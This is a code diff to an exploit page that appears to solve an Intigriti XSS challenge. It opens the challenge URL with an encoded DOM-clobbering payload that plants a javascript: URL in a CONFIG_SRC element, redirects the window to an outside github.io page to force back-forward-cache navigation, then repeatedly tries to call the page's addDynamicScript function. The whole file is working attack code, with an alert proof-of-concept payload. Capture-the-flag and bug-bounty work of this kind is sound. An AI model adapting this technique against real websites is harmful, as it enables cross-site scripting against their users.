@@ -2,7 +2,22 @@
     const begin = "https://challenge-0525.intigriti.io/begin?name=%3C%2Fstrong%3E%3Cdiv%20id%3Dstrong%3E%3C%2Fdiv%3E%3Cdiv%20id%3DCONFIG_SRC%20data-url%3Djavascript:alert(document.domain)%3Etest%3C%2Fdiv%3E%3Cstrong%3Ea";
     const w = window.open(begin);
 
+    // Ao abrir a página, espera 3s e força o back navigation via bfcache
     setTimeout(() => {
-        w.location = 'https://pedrojuniorrd.github.io/_layouts/back.html?n=1'; 
-    }, 3000); 
+        try {
+            w.location = 'https://pedrojuniorrd.github.io/_layouts/back.html?n=1';
+        } catch (e) {}
+    }, 3000);
+
+    // Força a execução de addDynamicScript após o retorno da bfcache
+    const interval = setInterval(() => {
+        try {
+            if (w.document && w.CONFIG_SRC) {
+                w.addDynamicScript();
+                clearInterval(interval); // Para o loop quando for executado
+            }
+        } catch (e) {
+            // Provavelmente cross-origin, ignora
+        }
+    }, 1000);
 </script>
